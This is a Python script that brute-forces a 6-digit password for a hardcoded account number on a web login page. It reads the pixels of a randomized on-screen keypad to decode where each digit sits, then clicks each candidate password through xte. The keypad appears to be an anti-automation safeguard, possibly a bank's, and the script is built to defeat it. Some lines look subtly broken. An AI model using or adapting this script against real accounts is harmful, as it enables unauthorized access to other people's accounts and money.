import gtk.gdk
import sys
from subprocess import Popen, PIPE
import numpy as np

def PixelAt(x, y):
    w = gtk.gdk.get_default_root_window()
    sz = w.get_size()
    pb = gtk.gdk.Pixbuf(gtk.gdk.COLORSPACE_RGB,False,8,sz[0],sz[1])
    pb = pb.get_from_drawable(w,w.get_colormap(),0,0,0,0,sz[0],sz[1])
    pixel_array = pb.get_pixels_array()
    return pixel_array[int(y)][int(x)]

def keypress(sequence):
    p = Popen(['xte'], stdin=PIPE)
    p.communicate(input=sequence)


Banner = True #Put this to True if there is a banner on the webpage

#Adjust mousemove coords to the number entry box using xdotool
ctrl_seq_1 = '''mousemove 370 400
mouseclick 1
sleep 1
key 3
sleep 1
key Return
key Down
key Return
'''
if (Banner): ctrl_seq_1 = ctrl_seq_1[0:15] + '8' + ctrl_seq_1[16:len(ctrl_seq_1)]

keypress(ctrl_seq_1)

for loop in range (000000,999999):
	account_number = '3711695904'
	password = str(loop).zfill(6)
	print("Attempting password "+str(loop)+"...")

	#Horizontal and vertical pixels between each button
	deltax = 82
	deltay = 79
	#Offset if website layout is changed
	dx = -37
	dy = 21
	if (Banner): dy = dy+73 #Use this if there is a webpage banner
	numbers = [9,6,8,1,3,2,0,4,5,7]
	decoded = np.zeros((10))
	cypher = np.loadtxt('cypher.txt')
	cypher = cypher.reshape((3,15,10))

	coords = np.zeros([2,15])
	coords[:,0] = (366+dx,563+dy)
	coords[:,1] = (370+dx,563+dy)
	coords[:,2] = (374+dx,563+dy)

	coords[:,3] = (366+dx,571+dy)
	coords[:,4] = (370+dx,571+dy)
	coords[:,5] = (374+dx,571+dy)
	
	coords[:,6] = (366+dx,574+dy)
	coords[:,7] = (371+dx,574+dy) #Dead centre 8 & 6 & 8 & 3 & 2
	coords[:,8] = (374+dx,574+dy)
	
	coords[:,9] = (366+dx,579+dy)
	coords[:,10] = (370+dx,579+dy)
	coords[:,11] = (374+dx,579+dy)
	
	coords[:,12] = (366+dx,587+dy)
	coords[:,13] = (370+dx,587+dy)
	coords[:,14] = (374+dx,587+dy)

	a = np.zeros([3,15,10])
	for i in range(0,10):
		if (loop == 000000): print(coords[:,7])
		for j in range(0,15):
			a[:,j,i] = PixelAt(coords[0,j],coords[1,j])
		if (i != 4):
			for j in range(0,15):
				coords[0,j] += deltax
		else:
			for j in range(0,15):
				coords[0,j] -= deltax*4
				coords[1,j] += deltay

	#Use this to read in the letter pixel values and set the order in numbers
	if (False):
		with file ('cypher.txt','w') as outfile:
			outfile.write('# Array shape: {0}\n'.format(a.shape))
			for a_slice in a:
				np.savetxt(outfile, a_slice, fmt = '%-7.2f')
			outfile.write('# New slice\n')

	for i in range(0,10):
		tmp = 100000
		for j in range(0,10):
			avg = np.average((a[:,:,i] - cypher[:,:,j])**2)
			if(avg < tmp):
				decoded[i] = numbers[j]
				tmp = avg
	if (loop == 000000): print(decoded[0:5])
	if (loop == 000000): print(decoded[5:10])

	newcoords = np.zeros([10,2])
	center = (370+dx,574+dy)
	j = 0
	for i in decoded:
		if j <=4:
			newcoords[int(i),:] = (center[0]+deltax*j,center[1])
		else:
			newcoords[int(i),:] = (center[0]+deltax*(j-5),center[1]+deltay)
		j += 1

	for i in password:
		ctrl_seq_2 = '''mousemove '''+str(int(newcoords[int(i),0])) + ''' ''' + str(int(newcoords[int(i),1])*10)
		ctrl_seq_3 = '''mouseclick 1
		'''
		keypress(ctrl_seq_2)
		keypress(ctrl_seq_3)
	
	ctrl_seq_4 = '''mousemove 454 750
	mouseclick 1
	'''
	if (Banner): ctrl_seq_4 = ctrl_seq_4[0:14] + '83' + ctrl_seq_4[16:len(ctrl_seq_4)]
	keypress(ctrl_seq_4)
